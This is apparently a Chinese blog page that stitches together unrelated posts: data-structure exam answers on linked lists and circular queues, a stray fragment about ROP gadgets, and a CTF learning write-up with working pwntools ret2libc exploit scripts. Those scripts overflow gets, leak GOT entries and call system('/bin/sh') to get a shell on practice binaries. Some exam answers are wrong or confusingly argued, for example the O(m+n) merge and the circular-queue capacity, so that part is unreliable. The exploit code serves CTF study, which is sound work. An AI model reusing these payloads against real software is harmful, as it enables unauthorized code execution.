数据结构基础--链表

发表于 2018-11-18 | 分类于 数据结构

在具有N个结点的单链表中，访问结点和增加结点的时间复杂度分别对应为O(1)和O(N)。 (1分)

答案应为F，单链表访问结点因为只能够一个一个的看，所以并不能像数组存储那样时间复杂度那么低，它的时间复杂度应该为 o(n)，实际上，单链表的几个常见操作时间复杂度都是o(n)的

若用链表来表示一个线性表，则表中元素的地址一定是连续的。 (1分)

答案应为F，链表存储地址并不是连续的，链表各个结点之间的联系是通过指针来实现的，指针指到的位置就算是链表的上下部分，但实际上指针具体指向哪个地址就是随意的了

将长度分别为m,n的两个单链表合并为一个单链表的时间复杂度为O(m+n)。 (1分)

答案应为F，这里因为自己也曾经和有序表的合并搞混过，所以把两种一块拿过来仔细说说

  • 普通单链表合并，只需要遍历第一个单链表找到结尾，把第二个单链表直接接上就完事了，时间复杂度为o(n)
  • 有序合并并且合并后仍为有序，我们需要遍历两个链表，对data进行比较决定顺序，所以 时间复杂度应该为o(n+m)

附加题目—将N条长度均为M的有序链表进行合并，合并以后的链表也保持有序，时间复杂度为()?

这应该说是上一个题目的难度up版，答案为o(n*m*logN)，至于具体过程我们在下面仔细

  • 取每个链表的第一个元素，组成一个数组，然后对数组进行排序，这是我们的第一步的时间复杂度O(NlogN)
  • 将我们排序后数组的第一个节点视为新链表的第一个节点，将剩余链表的结点每次取一个用二叉搜索的方式插入数组，时间复杂度为O(logN)
  • 重复上一步，因为第一步我们已经去除了m个结点，所以重复的次数应当是N*M-1 次，最终的时间复杂度应该是O(NlogN) + (M - 1) \ N * O(logN)= M * N* O(logN)*

(neuDS)单链表不是一种随机存取的存储结构。 (1分)
答案应为F，这个很简单，可以理解为能够通过地址的偏移直接得到相应位置的就是随机存储，比如线性表，不能的就是非随机存储，比如单链表

设h为不带头结点的单向链表。在h的头上插入一个新结点t的语句是：

答案应为t->next=h; h=t;因为我们要在头部插入一个新的结点，那我们就需要将新的头部指向原来的头部，而新的单链表的h应该就变成了t，所以有了第二句

在单链表中，若p所指的结点不是最后结点，在p之后插入s所指结点，则执行

答案应为s->next=p->next; p->next=s;，因为要插入一个结点s，所以我们要做的第一件事就是把插入前结点的信息先处理，防止信息丢失，所以我们先让s的next指向了p的next，保留下了p的信息，之后让p的next指向s实现插入就ok了

答案应为h->next == NULL;，因为带头结点的单链表比普通的链表多了个“头”，所以我们的“头”之后才是真正的结点，所以没有结点的条件也就是h的next为NULL

将两个结点数都为N且都从小到大有序的单向链表合并成一个从小到大有序的单向链表，那么可能的最少比较次数是：

答案应为N，很简单，假设第一个链表的最大值比第二个链表的最小值小，那么比较的时候其实只进行了第一个链表的N个元素和元素和第二个链表的第一个元素的比较的过程，后面就不用再比较了，所以比较次数其实最小就是N

线性表若采用链式存储结构时，要求内存中可用存储单元的地址

答案为连续或不连续都可以，上面提过这个问题了，不啰嗦了

数据结构复习—队列

1-1所谓“循环队列”是指用单向循环链表或者循环数组表示的队列。 (1分)

可以将向量空间想象成一个圆环，它首尾相接，这样的向量就是循环向量，如果我们的队列存储在这样的结构里我们就说是循环队列，当然在编程中我们可以用单链表或者是数组来表示它，但却不能划上等号

1-2在用数组表示的循环队列中，front值一定小于等于rear值。 (1分)

在循环队列中，front的值和rear的值有三种情况

  • front的值小于rear的值
  • front的值等于rear的值
  • front的值大于rear的值

1-3不论是入队列操作还是入栈操作,在顺序存储结构上都需要考虑”溢出”情况。 (2分)

这一点不用多说，在顺序存储结构中存储的容量是一定的，一定要考虑溢出的情况

2-1为解决计算机主机与打印机之间速度不匹配问题，通常设置一个打印数据缓冲区，主机将要输出的数据依次写入该缓冲区，而打印机则依次从该缓冲区中取出数据。该缓冲区的逻辑结构应该是？ (1分)

答案应为 队列 ，由于打印机的缓冲区要做的是“先进来的先打印”这样一个操作逻辑，自然需要我们 先进先出 的队列来实现了

2-2若已知一队列用单向链表表示，该单向链表的当前状态（含3个对象）是：1->2->3，其中x->y表示x的下一节点是y。此时，如果将对象4入队，然后队列头的对象出队，则单向链表的状态是： (1分)

答案应为 2->3->4 ，因为1是对头，3是队尾，当4入队后排在4后 变为队尾，1排队成功出队，2变为队头

2-3在一个链队列中，front和rear分别为头指针和尾指针，则插入一个结点s的操作为（ ）。 (2分)

答案应为 rear->next=s;rear=s; ，因为插入结点，所以rear的next应该是s，但s一旦入队s就变成了队尾，所以紧接着rear=s

**2-4依次在初始为空的队列中插入元素a,b,c,d以后，紧接着做了两次删除操作，此时的队头元素是（ ）。 (2分)

答案应为 c ，还是因为队列是 先进先出 的，所以a、b先进来，a、b先出去

2-5在一个不带头结点的非空链式队列中,假设f和r分别为队头和队尾指针,则插入s所指的结点运算是( )。 (2分)

答案应为 r->next=s; r=s; ，解析和第三题相同，在这里有没有头结点关系不大

2-6若用大小为6的数组来实现循环队列，且当前front和rear的值分别为0和4。当从队列中删除两个元素，再加入两个元素后，front和rear的值分别为多少？ (2分)

答案为 2和6 ，当删除两个元素时，front+2，而当加入两个元素时，rear+2

**2-7如果循环队列用大小为m的数组表示，且用队头指针front和队列元素个数size代替一般循环队列中的front和rear指针来表示队列的范围，那么这样的循环队列可以容纳的元素个数最多为： (2分)

答案应为 m ，因为队列有m个时，一旦循环起来我们会遇到front和rear相等的情况，而我们没有办法判断到底是队列为空还是队列已满，根本原因是 我们的队列有m+1种情况，而我们只有m种状态 ，所以我们可以用两种方法避免：

  • size进行标记判断是否队列已满
  • 只保存m-1个值，那队列就只有m中状态，恰好可以表示完全

2-8如果循环队列用大小为m的数组表示，队头位置为front、队列元素个数为size，那么队尾元素位置rear为： (2分)

答案应为 (front+size-1)%m ，公式，很好想，背下来就好了

这次题目和之前的也没区别，还是只有system，需要我们自己去写入/bin/sh，我们最理想的应该是类似mov [edi] ebp这样的指令了，但是gadgets没有那么合适的了，需要我们花一番心思去构造，我们可以先看一看这次的gadgets都有些什么

可以看到可用的mov指令就这一个，还拖家带口了一堆别的指令。那第一步的思路就清楚了，把data的地址想办法给ecx，把字符串想办法给edx，那问题就又来了，我们没有现成的pop指令啊，唯一的一个pop是ebx的

仔细观察了一番发现竟然又个xchg可以用来交换数据，那就是说我们可以在edx和ecx之间交换数据了，也就是说经过这道工序我们只需要想一个办法把edx或者ecx的其中一个能够写入数据，剩下的一个也就不攻自破了

pwn学习（二）

昨天算是把栈溢出最基础的题目做了做，今天继续，打算将ctf wiki里面关于ret2libc的题目做完，话不多说，直接开干

Ret2ilbc

首先来简单的看一下原理，所谓的ret2libc也就是控制函数去执行libc的函数，也就是我们将返回地址设置为某个函数的plt位置或者是具体位置（即函数对应的GOT表项），当然，通过这种方式可以绕过NX的保护机制。

下面就来看ctf wiki给出的三个例题吧，首先是第一个

很显然gets处存在栈溢出漏洞，紧接着我们来看看程序给我们“提供”了什么可以利用的点

可以看到程序非常大方的给了我们/bin/sh的字符串和system函数，那任务就结束了，我们只需要溢出s将函数的返回地址设置为system的地址，紧接着将system的参数设置为字符串的地址即可，直接上脚本了

from pwn import *
p = process('./ret2libc1.dms')
system = 0x8048460
bin = 0x08048720
payload = flat(['a'*112,system,'b'*4],bin)
p.sendline(payload)
p.interactive()

注意，我们的system作为我们将要返回的函数，他自然也有要返回的函数，因为我们只需要拿到sh，所以他具体返回什么我们就不用操心了，所以直接拿4个b把他的返回地址给填充掉就好了。当然，这是我们手动找到了system函数的地址，是不是还有其他的办法呢？当然有了，脚本一改

from pwn import *
p = process('./ret2libc1.dms')
elf = ELF('./ret2libc1.dms')
system_addr = elf.plt['system']
bin_addr = 0x8048720
payload = 112*'a' + p32(system_addr) +'b'*4 + p32(bin_addr)
p.sendline(payload)
p.interactive()

这里我们使用了ELF加载了我们的程序，而ELF的plt中就是保存着我们的地址与函数的一一映射，因此我们用plt[‘system’]就可以拿到system的地址了

紧接着看第二个题目

溢出点还是gets函数，但这次就没有第一次那么简单了，虽然还有system函数，但是没有可以供我们使用的/bin/sh字符串了，这时候我们就要开动脑筋想一想了，毛爷爷说过，没有条件创造条件，他没给字符串，我们可不可以自己输入一个进去呢？我们抓紧来看一下

首先就是天时啊，程序有个gets的函数，那我们何不借东风？拿它来一招瞒天过海？

其次地利也有啊，bss段又个0x64长度的buf2数组没被用过，刚好我们瞒天过海而来的字符串就由它再暗度陈仓了。天时地利，就差exp了

from pwn import *
p = process('./ret2libc2.dms')
elf = ELF('./ret2libc2.dms')
gets_addr = elf.plt['gets']
system_addr = elf.plt['system']
pop_ebx = 0x0804843d
buf2 = 0x804A080
payload = 112*'a' + p32(gets_addr) + p32(pop_ebx) + p32(buf2) + p32(system_addr) + 4*'a' + p32(buf2)
p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()

这里简单提一句为什么会有个pop ebx，主要是gets函数其实是改变了堆栈状态的，我们这里使用了pop主要是为了平衡堆栈的，你pop谁都可以，add也行。

趁热打铁把第三题也做了，这个题比起上面的两个题难度系数高了很多，这次是既没有了system函数也没有了/bin/sh，那就比较麻烦了，我们要找的东西可就多了。不过有个好消息就是我们的system函数是属于libc，而libc.so里函数的相对偏移是一定的，更让人高兴的是即使程序ASLR的保护，也只是针对地址的中间位进行随机，最低的12位并不会发生改变，而这些github上都有人把工作给我们做好了，我们只需要知道一个函数在libc的地址，就可以顺藤摸瓜搞到所有函数（甚至还有字符串/bin/sh）的地址，这样就人工创造了天时地利，只差我们的exp了

from pwn import *
from LibcSearcher import LibcSearcher
p = process('./ret2libc3.dms')
e = ELF('./ret2libc3.dms')
puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.symbols['main']
p.recv()
p.sendline(flat(['A' * 0x70, puts_plt, main, puts_got]))
puts_addr = u32(p.recv()[0:4])
libc = LibcSearcher('puts', puts_addr)
libcbase = puts_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
p.sendline(flat(['A' * 104, system_addr, 'b'*4, binsh_addr]))
p.interactive()

这里用到了新的工具—LibcSearcher，这个工具主要是能够帮助我们轻松的利用已有的got表的泄漏快速找到我们想要的东西，用法也很简单LibcSeacher(‘函数名’,地址)得到了libc，之后libc.dump()就可以得到偏移了，之后按照之前的方法构造payload就好了。要注意这里我们的pad要-8，因为我们是在main函数里又调用了main函数。

ret2text

原理说起来并不难，都知道程序的函数最后会进行return操作，将eip（64位程序中是rip）设置为函数调用者的地址，也就是我们说的设置返回地址，而我们可以利用程序中的一些“无限制”的读取函数来覆盖掉返回地址，而当我们设置好了合适的大小时，我们就可以将eip随意设置成我们想要执行的函数的地址，而如果这个函数恰恰程序又给我们提供了的话，就实现了ret2text，简单说就是控制程序执行他本身原有的代码。当然，我们进行控制的时候也可以利用“零碎”的代码组成我们想要的，这是后话了。
